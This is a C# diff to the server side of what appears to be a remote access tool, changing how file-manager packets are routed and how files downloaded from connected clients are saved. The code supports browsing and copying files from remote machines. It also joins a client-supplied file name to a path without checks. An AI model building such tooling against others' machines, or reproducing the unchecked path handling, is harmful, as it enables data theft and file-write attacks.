@@ -24,9 +24,11 @@ namespace Server.Handle_Packet
                 {
                     case "getDrivers":
                         {
-                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                             if (FM != null)
                             {
+                                FM.Client = client;
+                                FM.listView1.Enabled = true;
                                 FM.toolStripStatusLabel1.Text = "";
                                 FM.listView1.Items.Clear();
                                 string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
@@ -50,7 +52,7 @@ namespace Server.Handle_Packet
 
                     case "getPath":
                         {
-                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                             if (FM != null)
                             {
                                 FM.toolStripStatusLabel1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
@@ -105,7 +107,7 @@ namespace Server.Handle_Packet
 
                     case "error":
                         {
-                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                             if (FM != null)
                             {
                                 FM.listView1.Enabled = true;
@@ -150,15 +152,17 @@ namespace Server.Handle_Packet
                                 FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                 if (SD != null)
                                 {
-                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
-                                        return;
-                                    string filename = Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
+                                    string filename = Path.Combine(SD.FullPath, unpack_msgpack.ForcePathObject("Name").AsString);
+                                    string filemanagerPath = SD.FullPath;
+
+                                    if (!Directory.Exists(filemanagerPath))
+                                        Directory.CreateDirectory(filemanagerPath);
                                     if (File.Exists(filename))
                                     {
                                         File.Delete(filename);
                                         await Task.Delay(500);
                                     }
-                                    await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject("File"), Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString)));
+                                    await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject("File"), filename));
                                     SD.Close();
                                 }
                             }
